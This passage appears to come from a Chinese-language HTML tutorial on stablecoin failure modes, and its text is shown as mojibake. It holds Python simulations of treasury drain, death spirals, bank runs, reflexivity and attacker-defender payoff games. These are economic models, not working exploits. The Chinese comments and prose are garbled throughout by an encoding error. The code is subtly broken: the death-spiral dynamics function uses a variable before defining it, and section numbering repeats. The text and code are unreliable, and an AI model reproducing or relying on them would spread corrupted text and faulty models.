            # éšç€èµ„é‡‘å‡å°‘ï¼Œå¥—åˆ©æœºä¼šå¢åŠ ï¼ˆæµåŠ¨æ€§é™ä½ï¼‰
            market_inefficiency = 0.001 * (1 + aggressiveness * 2)
            
            drain = self.calculate_drain_rate(
                attacker_sophistication=0.8,
                market_inefficiency=market_inefficiency
            )
            
            remaining_treasury -= drain['daily_drain']
            
            results.append({
                'day': day,
                'treasury': remaining_treasury,
                'daily_drain': drain['daily_drain'],
                'health_score': remaining_treasury / self.treasury_size
            })
            
            if remaining_treasury <= 0:
                break
        
        return results

# ç¤ºä¾‹ï¼šåˆ†æCurveç­‰åè®®çš„é•¿æœŸé£é™©
curve_protocol = {
    'treasury_size': 50_000_000,  # 5000ä¸‡ç¾å…ƒ
    'daily_volume': 500_000_000,  # 5äº¿ç¾å…ƒ
    'fee_structure': {'base_fee': 0.0004},  # 0.04%
    'arbitrage_opportunities': 0.01  # 1%çš„äº¤æ˜“å­˜åœ¨å¥—åˆ©æœºä¼š
}

drain_attack = LongTermDrainAttack(curve_protocol)

# åˆ†ææ¶ˆè€—ç‡
drain_analysis = drain_attack.calculate_drain_rate(
    attacker_sophistication=0.7,  # ä¸­ç­‰æ°´å¹³æ”»å‡»è€…
    market_inefficiency=0.002     # 0.2%å¸‚åœºéæ•ˆç‡
)

print(f"æ¯æ—¥èµ„æœ¬æ¶ˆè€—: ${drain_analysis['daily_drain']:,.0f}")
print(f"é¢„è®¡è€—å°½æ—¶é—´: {drain_analysis['depletion_days']:.0f} å¤©")</code></pre>
                </div>
            </div>
            
            <h4>10.1.2 æ­»äº¡èºæ—‹ï¼ˆDeath Spiralï¼‰æ·±åº¦åˆ†æ</h4>
            <p>ç®—æ³•ç¨³å®šå¸ç‰¹æœ‰çš„æ”»å‡»æ¨¡å¼ï¼Œé€šè¿‡æ•°å­¦æ¨¡å‹é‡åŒ–å…¶æ¼”åŒ–è¿‡ç¨‹ï¼š</p>
            
            <div class="theory-box">
                <h5>æ­»äº¡èºæ—‹çš„çŠ¶æ€æ–¹ç¨‹å»ºæ¨¡</h5>
                <p>å®šä¹‰ç³»ç»ŸçŠ¶æ€å˜é‡ï¼š</p>
                <ul>
                    <li>P<sub>t</sub>: æ²»ç†ä»£å¸åœ¨æ—¶é—´tçš„ä»·æ ¼</li>
                    <li>S<sub>t</sub>: ç¨³å®šå¸ä¾›åº”é‡</li>
                    <li>R<sub>t</sub>: åè®®å‚¨å¤‡é‡‘ä»·å€¼</li>
                    <li>D<sub>t</sub>: ç¨³å®šå¸åç¦»é”šå®šç¨‹åº¦</li>
                </ul>
                
                <p>é€’å½’å…³ç³»ï¼š</p>
                <pre>P_t = P_{t-1} Ã— (1 - Î± Ã— D_{t-1} - Î² Ã— Î”S_{t-1}/S_{t-1})
S_t = S_{t-1} Ã— (1 - Î³ Ã— max(0, D_{t-1}))
R_t = R_{t-1} + P_t Ã— M_t - Redemption_t
D_t = |1 - Price_{stable,t}|</pre>
                
                <p>å…¶ä¸­ï¼š</p>
                <ul>
                    <li>Î±: ä»·æ ¼å¯¹è„±é”šçš„æ•æ„Ÿåº¦</li>
                    <li>Î²: ä¾›åº”é‡å˜åŒ–çš„ä»·æ ¼å†²å‡»ç³»æ•°</li>
                    <li>Î³: èµå›ç‡å‚æ•°</li>
                    <li>M<sub>t</sub>: æ–°é“¸é€ çš„æ²»ç†ä»£å¸æ•°é‡</li>
                </ul>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: æ­»äº¡èºæ—‹æ¨¡æ‹Ÿå™¨</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
import matplotlib.pyplot as plt
from scipy.integrate import odeint

class DeathSpiralSimulator:
    def __init__(self, alpha=0.3, beta=0.5, gamma=0.2, 
                 initial_price=100, initial_supply=1e9):
        self.alpha = alpha  # ä»·æ ¼å¯¹è„±é”šçš„æ•æ„Ÿåº¦
        self.beta = beta    # ä¾›åº”é‡å˜åŒ–çš„ä»·æ ¼å†²å‡»
        self.gamma = gamma  # èµå›ç‡å‚æ•°
        self.P0 = initial_price
        self.S0 = initial_supply
        
    def dynamics(self, state, t, shock_time=50, shock_magnitude=0.2):
        P, S, D = state
        
        # å¤–éƒ¨å†²å‡»
        if t >= shock_time and t <= shock_time + 1:
            D = shock_magnitude
        else:
            # ç¨³å®šå¸ä»·æ ¼åŠ¨æ€ï¼ˆç®€åŒ–æ¨¡å‹ï¼‰
            D = max(0, D - 0.01 + 0.1 * (1 - P/self.P0))
        
        # æ²»ç†ä»£å¸ä»·æ ¼åŠ¨æ€
        dP_dt = -P * (self.alpha * D + self.beta * max(0, -dS_dt/S))
        
        # ä¾›åº”é‡åŠ¨æ€ï¼ˆèµå›ï¼‰
        dS_dt = -S * self.gamma * max(0, D)
        
        # è„±é”šç¨‹åº¦å˜åŒ–
        dD_dt = 0.05 * (1 - P/self.P0) - 0.02
        
        return [dP_dt, dS_dt, dD_dt]
    
    def simulate(self, T=200, shock_time=50, shock_magnitude=0.2):
        t = np.linspace(0, T, 1000)
        initial_state = [self.P0, self.S0, 0]
        
        solution = odeint(self.dynamics, initial_state, t, 
                         args=(shock_time, shock_magnitude))
        
        return t, solution
    
    def plot_results(self, t, solution):
        P, S, D = solution.T
        
        fig, axes = plt.subplots(3, 1, figsize=(10, 8))
        
        # æ²»ç†ä»£å¸ä»·æ ¼
        axes[0].plot(t, P)
        axes[0].set_ylabel('æ²»ç†ä»£å¸ä»·æ ¼')
        axes[0].axhline(y=self.P0, color='r', linestyle='--', alpha=0.5)
        
        # ç¨³å®šå¸ä¾›åº”é‡
        axes[1].plot(t, S/1e9)
        axes[1].set_ylabel('ç¨³å®šå¸ä¾›åº”é‡ (B)')
        
        # è„±é”šç¨‹åº¦
        axes[2].plot(t, D)
        axes[2].set_ylabel('è„±é”šç¨‹åº¦')
        axes[2].set_xlabel('æ—¶é—´')
        axes[2].axhline(y=0, color='g', linestyle='--', alpha=0.5)
        
        plt.tight_layout()
        return fig

# è¿è¡Œæ¨¡æ‹Ÿ
simulator = DeathSpiralSimulator()
t, solution = simulator.simulate()
fig = simulator.plot_results(t, solution)

# åˆ†æä¸´ç•Œç‚¹
P = solution[:, 0]
critical_point = np.where(P < 0.1 * simulator.P0)[0]
if len(critical_point) > 0:
    print(f"ç³»ç»Ÿå´©æºƒæ—¶é—´: t = {t[critical_point[0]]:.2f}")
    print(f"å´©æºƒæ—¶æ²»ç†ä»£å¸ä»·æ ¼: ${P[critical_point[0]]:.2f}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.3 é“¶è¡ŒæŒ¤å…‘ï¼ˆBank Runï¼‰æ¨¡å‹</h4>
            <p>åŸºäºDiamond-Dybvigæ¨¡å‹çš„æ·±å…¥åˆ†æï¼Œå‚æ•°åŒ–ç¨³å®šå¸ç³»ç»Ÿçš„æŒ¤å…‘é£é™©ï¼š</p>
            
            <div class="theory-box">
                <h5>å‚æ•°åŒ–Diamond-Dybvigæ¨¡å‹</h5>
                <p>å°†ç»å…¸é“¶è¡ŒæŒ¤å…‘æ¨¡å‹æ˜ å°„åˆ°ç¨³å®šå¸ç³»ç»Ÿï¼š</p>
                <ul>
                    <li><strong>R</strong> (é•¿æœŸæŠ•èµ„å›æŠ¥) â†’ ç¨³å®šå¸åè®®æ”¶ç›Šç‡ï¼ˆå¦‚è´¨æŠ¼æ”¶ç›Šï¼‰</li>
                    <li><strong>L</strong> (çŸ­æœŸå–æ¬¾æƒ©ç½š) â†’ èµå›è´¹ç”¨æˆ–æ»‘ç‚¹æŸå¤±</li>
                    <li><strong>p</strong> (ææ…Œæ¦‚ç‡) â†’ åŸºäºé“¾ä¸Šæ•°æ®çš„ææ…ŒæŒ‡æ ‡</li>
                </ul>
                
                <p>æŒ¤å…‘ä¸´ç•Œæ¡ä»¶ï¼šå½“ä»¥ä¸‹ä¸ç­‰å¼æˆç«‹æ—¶ï¼Œç†æ€§ç”¨æˆ·é€‰æ‹©æŒ¤å…‘ï¼š</p>
                <pre>E[U(early_withdrawal)] > E[U(wait)]
å³: u(1-L) > p Ã— u(0) + (1-p) Ã— u(R)</pre>
                
                <p>ææ…Œæ¦‚ç‡ä¼°è®¡ï¼š</p>
                <pre>p = Ïƒ(wâ‚ Ã— large_withdrawals + wâ‚‚ Ã— price_deviation + wâ‚ƒ Ã— social_sentiment)</pre>
                å…¶ä¸­Ïƒæ˜¯sigmoidå‡½æ•°ï¼Œwæ˜¯æƒé‡å‚æ•°</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: é“¶è¡ŒæŒ¤å…‘åšå¼ˆåˆ†æ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from scipy.optimize import fsolve
import matplotlib.pyplot as plt

class BankRunModel:
    def __init__(self, R=1.2, L=0.05, withdrawal_cost=0.02):
        self.R = R  # é•¿æœŸå›æŠ¥ç‡
        self.L = L  # æµåŠ¨æ€§æŸå¤±
        self.withdrawal_cost = withdrawal_cost
        
    def utility(self, x, risk_aversion=2):
        """CRRAæ•ˆç”¨å‡½æ•°"""
        if risk_aversion == 1:
            return np.log(x)
        return (x**(1-risk_aversion) - 1) / (1-risk_aversion)
    
    def panic_probability(self, large_withdrawals, price_deviation, 
                         social_sentiment, weights=[0.4, 0.4, 0.2]):
        """åŸºäºé“¾ä¸Šæ•°æ®ä¼°è®¡ææ…Œæ¦‚ç‡"""
        signal = (weights[0] * large_withdrawals + 
                 weights[1] * price_deviation + 
                 weights[2] * social_sentiment)
        return 1 / (1 + np.exp(-5 * (signal - 0.5)))
    
    def find_equilibrium(self, p):
        """æ‰¾åˆ°ç»™å®šææ…Œæ¦‚ç‡ä¸‹çš„å‡è¡¡"""
        # æå‰å–æ¬¾çš„æœŸæœ›æ•ˆç”¨
        early_utility = self.utility(1 - self.L)
        
        # ç­‰å¾…çš„æœŸæœ›æ•ˆç”¨
        wait_utility = (p * self.utility(0.01) +  # æŒ¤å…‘å‘ç”Ÿæ—¶å‡ ä¹æ²¡æœ‰å›æŠ¥
                       (1-p) * self.utility(self.R))
        
        return early_utility - wait_utility
    
    def critical_mass_analysis(self):
        """åˆ†æè§¦å‘æŒ¤å…‘çš„ä¸´ç•Œè´¨é‡"""
        p_values = np.linspace(0, 1, 100)
        equilibrium_diff = [self.find_equilibrium(p) for p in p_values]
        
        # æ‰¾åˆ°å‡è¡¡è½¬æ¢ç‚¹
        sign_changes = np.where(np.diff(np.sign(equilibrium_diff)))[0]
        
        if len(sign_changes) > 0:
            critical_p = p_values[sign_changes[0]]
            return critical_p
        return None
    
    def simulate_contagion(self, initial_withdrawers=0.1, steps=50):
        """æ¨¡æ‹ŸæŒ¤å…‘ä¼ æŸ“è¿‡ç¨‹"""
        withdrawers = [initial_withdrawers]
        
        for t in range(steps):
            # å½“å‰ææ…Œæ¦‚ç‡åŸºäºææ¬¾æ¯”ä¾‹
            p = self.panic_probability(withdrawers[-1], 0.1, 0.1)
            
            # æ–°å¢ææ¬¾è€…åŸºäºæœŸæœ›æ•ˆç”¨å·®å¼‚
            utility_diff = self.find_equilibrium(p)
            if utility_diff > 0:
                # æŒ¤å…‘åŠ é€Ÿ
                new_withdrawers = min(1.0, withdrawers[-1] * (1 + 0.2))
            else:
                # æŒ¤å…‘å‡ç¼“
                new_withdrawers = max(0, withdrawers[-1] * 0.95)
            
            withdrawers.append(new_withdrawers)
        
        return withdrawers

# åˆ†æç¤ºä¾‹
model = BankRunModel(R=1.15, L=0.03)
critical_p = model.critical_mass_analysis()
print(f"è§¦å‘æŒ¤å…‘çš„ä¸´ç•Œææ…Œæ¦‚ç‡: {critical_p:.3f}")

# æ¨¡æ‹ŸæŒ¤å…‘ä¼ æŸ“
withdrawers = model.simulate_contagion(initial_withdrawers=0.15)

plt.figure(figsize=(10, 6))
plt.plot(withdrawers, linewidth=2)
plt.axhline(y=critical_p, color='r', linestyle='--', 
            label=f'ä¸´ç•Œç‚¹ ({critical_p:.3f})')
plt.xlabel('æ—¶é—´æ­¥')
plt.ylabel('ææ¬¾è€…æ¯”ä¾‹')
plt.title('é“¶è¡ŒæŒ¤å…‘ä¼ æŸ“åŠ¨æ€')
plt.legend()
plt.grid(True, alpha=0.3)
plt.show()</code></pre>
                </div>
            </div>
            
            <h4>10.1.4 åèº«æ€§æ”»å‡»ï¼ˆReflexivity Attackï¼‰</h4>
            <p>åŸºäºç´¢ç½—æ–¯åèº«æ€§ç†è®ºï¼Œé‡åŒ–å¸‚åœºé¢„æœŸä¸åŸºæœ¬é¢çš„ç›¸äº’ä½œç”¨ï¼š</p>
            
            <div class="theory-box">
                <h5>åèº«æ€§åŠ¨åŠ›å­¦æ¨¡å‹</h5>
                <p>æ ¸å¿ƒæ–¹ç¨‹ï¼š</p>
                <pre>å¸‚åœºä»·æ ¼ P(t) = f(åŸºæœ¬é¢ F(t), å¸‚åœºé¢„æœŸ E[P(t+1)])
åŸºæœ¬é¢ F(t) = g(å¸‚åœºä»·æ ¼ P(t-1), å¤–éƒ¨å› ç´  X(t))</pre>
                
                <p>å¯¹äºç¨³å®šå¸ç³»ç»Ÿï¼š</p>
                <ul>
                    <li>å½“P < $1æ—¶ï¼Œè´Ÿé¢é¢„æœŸå¯¼è‡´èµå›å¢åŠ </li>
                    <li>èµå›å¢åŠ å¯¼è‡´æŠµæŠ¼å“æŠ›å”®ï¼Œå‹ä½æŠµæŠ¼å“ä»·æ ¼</li>
                    <li>æŠµæŠ¼å“ä»·å€¼ä¸‹é™æ¶åŒ–åŸºæœ¬é¢ï¼Œè¿›ä¸€æ­¥å‹ä½ç¨³å®šå¸ä»·æ ¼</li>
                    <li>å½¢æˆè‡ªæˆ‘å¼ºåŒ–çš„è´Ÿåé¦ˆå¾ªç¯</li>
                </ul>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: åèº«æ€§æ”»å‡»æ¨¡æ‹Ÿ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">class ReflexivityAttackModel:
    def __init__(self, expectation_weight=0.6, fundamental_weight=0.4):
        self.alpha = expectation_weight
        self.beta = fundamental_weight
        self.sentiment_decay = 0.95  # æƒ…ç»ªè¡°å‡å› å­
        
    def price_formation(self, fundamental, expected_price):
        """ä»·æ ¼å½¢æˆæœºåˆ¶"""
        return self.beta * fundamental + self.alpha * expected_price
    
    def fundamental_dynamics(self, price, collateral_value, reserve_ratio):
        """åŸºæœ¬é¢åŠ¨æ€"""
        # åŸºæœ¬é¢ = æŠµæŠ¼å“ä»·å€¼ / ç¨³å®šå¸ä¾›åº”é‡
        fundamental = collateral_value * reserve_ratio
        
        # ä»·æ ¼åç¦»ä¼šå½±å“æŠµæŠ¼å“ä»·å€¼ï¼ˆæŠ›å”®å‹åŠ›ï¼‰
        if price < 1.0:
            selling_pressure = (1.0 - price) * 0.5
            collateral_value *= (1 - selling_pressure)
        
        return fundamental, collateral_value
    
    def expectation_formation(self, price_history, sentiment):
        """é¢„æœŸå½¢æˆæœºåˆ¶ï¼ˆè‡ªé€‚åº”é¢„æœŸ + å¸‚åœºæƒ…ç»ªï¼‰"""
        if len(price_history) < 2:
            return 1.0
        
        # è¶‹åŠ¿å¤–æ¨
        trend = price_history[-1] - price_history[-2]
        adaptive_expectation = price_history[-1] + trend * 0.5
        
        # æƒ…ç»ªå½±å“
        sentiment_adjustment = (sentiment - 0.5) * 0.2
        
        return adaptive_expectation + sentiment_adjustment
    
    def simulate_attack(self, initial_sentiment_shock=-0.3, periods=100):
        """æ¨¡æ‹Ÿåèº«æ€§æ”»å‡»"""
        # åˆå§‹çŠ¶æ€
        price_history = [1.0]
        fundamental = 1.0
        collateral_value = 1e8  # $100M
        reserve_ratio = 1.5
        sentiment = 0.5  # ä¸­æ€§æƒ…ç»ª
        
        fundamentals = [fundamental]
        sentiments = [sentiment]
        
        for t in range(periods):
            # æ”»å‡»è€…åœ¨t=10æ—¶åˆ¶é€ è´Ÿé¢æƒ…ç»ª
            if t == 10:
                sentiment += initial_sentiment_shock
            
            # å½¢æˆé¢„æœŸ
            expected_price = self.expectation_formation(price_history, sentiment)
            
            # ä»·æ ¼å½¢æˆ
            price = self.price_formation(fundamental, expected_price)
            price_history.append(price)
            
            # åŸºæœ¬é¢æ›´æ–°
            fundamental, collateral_value = self.fundamental_dynamics(
                price, collateral_value, reserve_ratio
            )
            fundamentals.append(fundamental)
            
            # æƒ…ç»ªæ¼”åŒ–ï¼ˆå‡å€¼å›å½’ + ä»·æ ¼åé¦ˆï¼‰
            sentiment = sentiment * self.sentiment_decay + 0.5 * (1 - self.sentiment_decay)
            if price < 0.98:  # ä»·æ ¼ä¸‹è·ŒåŠ å‰§ææ…Œ
                sentiment -= 0.02
            sentiment = np.clip(sentiment, 0, 1)
            sentiments.append(sentiment)
            
            # ç³»ç»Ÿå´©æºƒæ£€æŸ¥
            if price < 0.5 or collateral_value < 1e7:
                print(f"ç³»ç»Ÿåœ¨ç¬¬{t}æœŸå´©æºƒ")
                break
        
        return price_history, fundamentals, sentiments

# è¿è¡Œåèº«æ€§æ”»å‡»æ¨¡æ‹Ÿ
model = ReflexivityAttackModel()
prices, fundamentals, sentiments = model.simulate_attack()

# å¯è§†åŒ–ç»“æœ
fig, axes = plt.subplots(3, 1, figsize=(10, 9))

# ä»·æ ¼è½¨è¿¹
axes[0].plot(prices, 'b-', linewidth=2)
axes[0].axhline(y=1.0, color='r', linestyle='--', alpha=0.5)
axes[0].fill_between(range(len(prices)), 0.98, 1.02, alpha=0.2, color='gray')
axes[0].set_ylabel('ç¨³å®šå¸ä»·æ ¼')
axes[0].set_title('åèº«æ€§æ”»å‡»ä¸‹çš„ä»·æ ¼åŠ¨æ€')

# åŸºæœ¬é¢
axes[1].plot(fundamentals, 'g-', linewidth=2)
axes[1].set_ylabel('åŸºæœ¬é¢ä»·å€¼')

# å¸‚åœºæƒ…ç»ª
axes[2].plot(sentiments, 'r-', linewidth=2)
axes[2].axhline(y=0.5, color='gray', linestyle='--', alpha=0.5)
axes[2].set_ylabel('å¸‚åœºæƒ…ç»ª')
axes[2].set_xlabel('æ—¶é—´')

plt.tight_layout()
plt.show()</code></pre>
                </div>
            </div>
            
            <h4>10.1.5 åšå¼ˆè®ºåˆ†æ</h4>
            <p>å¤šæ–¹åšå¼ˆä¸­çš„çº³ä»€å‡è¡¡ä¸æ”»å‡»æ¿€åŠ±åˆ†æï¼š</p>
            
            <div class="theory-box">
                <h5>æ”»å‡»æ”¶ç›ŠçŸ©é˜µ</h5>
                <p>å®šä¹‰æ”»å‡»è€…å’Œé˜²å¾¡è€…çš„æ”¶ç›Šå‡½æ•°ï¼š</p>
                <table class="protocol-comparison">
                    <tr>
                        <th></th>
                        <th>é˜²å¾¡è€…ï¼šè¢«åŠ¨é˜²å¾¡</th>
                        <th>é˜²å¾¡è€…ï¼šä¸»åŠ¨ç›‘æ§</th>
                        <th>é˜²å¾¡è€…ï¼šåŠ¨æ€è°ƒæ•´</th>
                    </tr>
                    <tr>
                        <td><strong>æ”»å‡»è€…ï¼šä»·æ ¼æ“çºµ</strong></td>
                        <td>(10, -20)</td>
                        <td>(-5, -10)</td>
                        <td>(-10, -5)</td>
                    </tr>
                    <tr>
                        <td><strong>æ”»å‡»è€…ï¼šé—ªç”µè´·æ”»å‡»</strong></td>
                        <td>(15, -30)</td>
                        <td>(5, -15)</td>
                        <td>(-8, -8)</td>
                    </tr>
                    <tr>
                        <td><strong>æ”»å‡»è€…ï¼šæ²»ç†æ”»å‡»</strong></td>
                        <td>(8, -15)</td>
                        <td>(3, -8)</td>
                        <td>(0, -3)</td>
                    </tr>
                </table>
                <p class="note">æ•°å€¼è¡¨ç¤ºï¼ˆæ”»å‡»è€…æ”¶ç›Šï¼Œé˜²å¾¡è€…æŸå¤±ï¼‰ï¼Œå•ä½ï¼šé¢„æœŸåˆ©æ¶¦ç‡%</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: ç¨³å®šå¸ç³»ç»Ÿåšå¼ˆåˆ†æ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from scipy.optimize import minimize
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

class StablecoinGameTheory:
    def __init__(self):
        # å®šä¹‰æ”¶ç›ŠçŸ©é˜µ
        self.payoff_matrix = {
            'price_manipulation': {
                'passive': (10, -20),
                'monitor': (-5, -10),
                'dynamic': (-10, -5)
            },
            'flash_loan': {
                'passive': (15, -30),
                'monitor': (5, -15),
                'dynamic': (-8, -8)
            },
            'governance': {
                'passive': (8, -15),
                'monitor': (3, -8),
                'dynamic': (0, -3)
            }
        }
        
    def calculate_mixed_strategy_nash(self):
        """è®¡ç®—æ··åˆç­–ç•¥çº³ä»€å‡è¡¡"""
        # ç®€åŒ–ä¸º2x2åšå¼ˆè¿›è¡Œæ¼”ç¤º
        # æ”»å‡»è€…ï¼šä»·æ ¼æ“çºµ vs é—ªç”µè´·
        # é˜²å¾¡è€…ï¼šè¢«åŠ¨ vs ä¸»åŠ¨
        A = np.array([[10, -5], [15, 5]])  # æ”»å‡»è€…æ”¶ç›Š
        B = np.array([[-20, -10], [-30, -15]])  # é˜²å¾¡è€…æ”¶ç›Šï¼ˆè½¬ä¸ºæ­£å€¼ï¼‰
        B = -B
        
        # ä½¿ç”¨çº¿æ€§è§„åˆ’æ±‚è§£æ··åˆç­–ç•¥
        from scipy.optimize import linprog
        
        # æ”»å‡»è€…çš„æ··åˆç­–ç•¥
        c = [0, 0, -1]  # æœ€å¤§åŒ–æœŸæœ›æ”¶ç›Š
        A_ub = np.array([[-A[0,0], -A[1,0], 1],
                        [-A[0,1], -A[1,1], 1]])
        b_ub = [0, 0]
        A_eq = [[1, 1, 0]]
        b_eq = [1]
        bounds = [(0, 1), (0, 1), (None, None)]
        
        result_attacker = linprog(c, A_ub=A_ub, b_ub=b_ub, 
                                 A_eq=A_eq, b_eq=b_eq, bounds=bounds)
        
        return result_attacker.x[:2]
    
    def simulate_evolutionary_dynamics(self, iterations=1000):
        """æ¨¡æ‹Ÿæ¼”åŒ–åšå¼ˆåŠ¨æ€"""
        # åˆå§‹ç­–ç•¥åˆ†å¸ƒ
        attacker_strategies = np.array([0.33, 0.33, 0.34])  # ä¸‰ç§æ”»å‡»
        defender_strategies = np.array([0.33, 0.33, 0.34])  # ä¸‰ç§é˜²å¾¡
        
        history = {
            'attacker': [attacker_strategies.copy()],
            'defender': [defender_strategies.copy()]
        }
        
        for _ in range(iterations):
            # è®¡ç®—æœŸæœ›æ”¶ç›Š
            attacker_payoffs = self.calculate_expected_payoffs(
                attacker_strategies, defender_strategies, 'attacker'
            )
            defender_payoffs = self.calculate_expected_payoffs(
                attacker_strategies, defender_strategies, 'defender'
            )
            
            # å¤åˆ¶åŠ¨æ€æ›´æ–°
            avg_payoff_a = np.dot(attacker_strategies, attacker_payoffs)
            avg_payoff_d = np.dot(defender_strategies, defender_payoffs)
            
            attacker_strategies += 0.01 * attacker_strategies * \
                                  (attacker_payoffs - avg_payoff_a)
            defender_strategies += 0.01 * defender_strategies * \
                                  (defender_payoffs - avg_payoff_d)
            
            # å½’ä¸€åŒ–
            attacker_strategies /= attacker_strategies.sum()
            defender_strategies /= defender_strategies.sum()
            
            history['attacker'].append(attacker_strategies.copy())
            history['defender'].append(defender_strategies.copy())
        
        return history
    
    def calculate_expected_payoffs(self, attacker_strat, defender_strat, player):
        """è®¡ç®—æœŸæœ›æ”¶ç›Š"""
        attacks = ['price_manipulation', 'flash_loan', 'governance']
        defenses = ['passive', 'monitor', 'dynamic']
        
        if player == 'attacker':
            payoffs = np.zeros(3)
            for i, attack in enumerate(attacks):
                for j, defense in enumerate(defenses):
                    payoffs[i] += defender_strat[j] * \
                                 self.payoff_matrix[attack][defense][0]
        else:
            payoffs = np.zeros(3)
            for j, defense in enumerate(defenses):
                for i, attack in enumerate(attacks):
                    payoffs[j] += attacker_strat[i] * \
                                 self.payoff_matrix[attack][defense][1]
        
        return payoffs
    
    def plot_evolutionary_dynamics(self, history):
        """ç»˜åˆ¶æ¼”åŒ–åŠ¨æ€"""
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 6))
        
        # æ”»å‡»è€…ç­–ç•¥æ¼”åŒ–
        attacker_history = np.array(history['attacker'])
        ax1.plot(attacker_history[:, 0], label='ä»·æ ¼æ“çºµ', linewidth=2)
        ax1.plot(attacker_history[:, 1], label='é—ªç”µè´·', linewidth=2)
        ax1.plot(attacker_history[:, 2], label='æ²»ç†æ”»å‡»', linewidth=2)
        ax1.set_xlabel('è¿­ä»£æ¬¡æ•°')
        ax1.set_ylabel('ç­–ç•¥æ¯”ä¾‹')
        ax1.set_title('æ”»å‡»è€…ç­–ç•¥æ¼”åŒ–')
        ax1.legend()
        ax1.grid(True, alpha=0.3)
        
        # é˜²å¾¡è€…ç­–ç•¥æ¼”åŒ–
        defender_history = np.array(history['defender'])
        ax2.plot(defender_history[:, 0], label='è¢«åŠ¨é˜²å¾¡', linewidth=2)
        ax2.plot(defender_history[:, 1], label='ä¸»åŠ¨ç›‘æ§', linewidth=2)
        ax2.plot(defender_history[:, 2], label='åŠ¨æ€è°ƒæ•´', linewidth=2)
        ax2.set_xlabel('è¿­ä»£æ¬¡æ•°')
        ax2.set_ylabel('ç­–ç•¥æ¯”ä¾‹')
        ax2.set_title('é˜²å¾¡è€…ç­–ç•¥æ¼”åŒ–')
        ax2.legend()
        ax2.grid(True, alpha=0.3)
        
        plt.tight_layout()
        return fig

# è¿è¡Œåšå¼ˆåˆ†æ
game = StablecoinGameTheory()
mixed_strategy = game.calculate_mixed_strategy_nash()
print(f"æ”»å‡»è€…æ··åˆç­–ç•¥çº³ä»€å‡è¡¡: {mixed_strategy}")

# æ¨¡æ‹Ÿæ¼”åŒ–åŠ¨æ€
history = game.simulate_evolutionary_dynamics()
fig = game.plot_evolutionary_dynamics(history)</code></pre>
                </div>
            </div>
            
            <h5>5. æ­»äº¡èºæ—‹çš„æ•°å­¦å½¢å¼åŒ–</h5>
            <p>æ­»äº¡èºæ—‹ä¸ä»…æ˜¯ä¸€ä¸ªå®šæ€§æ¦‚å¿µï¼Œæ›´å¯ä»¥é€šè¿‡å·®åˆ†æ–¹ç¨‹ç³»ç»Ÿä¸¥æ ¼å»ºæ¨¡ã€‚æˆ‘ä»¬å®šä¹‰çŠ¶æ€è½¬ç§»æ–¹ç¨‹æ¥æ•è·ä»·æ ¼ã€å‚¨å¤‡å’Œä¾›åº”é‡ä¹‹é—´çš„åŠ¨æ€å…³ç³»ï¼š</p>
            
            <div class="math-formula">
                <p><strong>çŠ¶æ€æ–¹ç¨‹ï¼š</strong></p>
                <ul>
                    <li>P<sub>t</sub> = Î± Â· R<sub>t-1</sub> / S<sub>t-1</sub> + Î² Â· E[P<sub>t+1</sub>] - Î³ Â· (S<sub>t</sub> - S<sub>t-1</sub>)</li>
                    <li>S<sub>t</sub> = S<sub>t-1</sub> + Î¼ Â· (1 - P<sub>t</sub>) Â· S<sub>t-1</sub></li>
                    <li>R<sub>t</sub> = R<sub>t-1</sub> - Ï Â· (1 - P<sub>t</sub>) Â· S<sub>t-1</sub></li>
                </ul>
                <p>å…¶ä¸­ï¼šP<sub>t</sub> = æ²»ç†ä»£å¸ä»·æ ¼ï¼ŒR<sub>t</sub> = å‚¨å¤‡é‡‘ï¼ŒS<sub>t</sub> = ç¨³å®šå¸ä¾›åº”é‡</p>
                <p>å‚æ•°ï¼šÎ± = åŸºæœ¬é¢æƒé‡ï¼ŒÎ² = é¢„æœŸæƒé‡ï¼ŒÎ³ = ä¾›åº”å†²å‡»ç³»æ•°ï¼ŒÎ¼ = é“¸å¸ç‡ï¼ŒÏ = èµå›ç‡</p>
            </div>
            
            <h5>5. Lyapunovç¨³å®šæ€§åˆ†æ</h5>
            <p>ä¸ºäº†åˆ†æç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œæˆ‘ä»¬ä½¿ç”¨Lyapunovå‡½æ•°æ–¹æ³•ï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># æ­»äº¡èºæ—‹çš„ä¸¥æ ¼æ•°å­¦å»ºæ¨¡ä¸ç¨³å®šæ€§åˆ†æ
import numpy as np
from scipy.optimize import fsolve
from scipy.linalg import eigvals
import matplotlib.pyplot as plt

class StablecoinStabilityAnalysis:
    """ç¨³å®šå¸ç³»ç»Ÿçš„ç¨³å®šæ€§åˆ†ææ¡†æ¶"""
    
    def __init__(self, params: dict):
        self.alpha = params['alpha']  # åŸºæœ¬é¢æƒé‡
        self.beta = params['beta']    # é¢„æœŸæƒé‡
        self.gamma = params['gamma']  # ä¾›åº”å†²å‡»ç³»æ•°
        self.mu = params['mu']        # é“¸å¸ç‡
        self.rho = params['rho']      # èµå›ç‡
        
    def state_transition(self, state: np.ndarray, expectation: float) -> np.ndarray:
        """
        çŠ¶æ€è½¬ç§»å‡½æ•°
        state = [P_t, S_t, R_t]
        """
        P, S, R = state
        
        # ä»·æ ¼åŠ¨æ€ï¼ˆåŒ…å«åèº«æ€§ï¼‰
        P_next = self.alpha * R / S + self.beta * expectation - self.gamma * self.mu * (1 - P) * S
        
        # ä¾›åº”åŠ¨æ€
        S_next = S + self.mu * (1 - P) * S
        
        # å‚¨å¤‡åŠ¨æ€
        R_next = R - self.rho * (1 - P) * S
        
        return np.array([P_next, S_next, R_next])
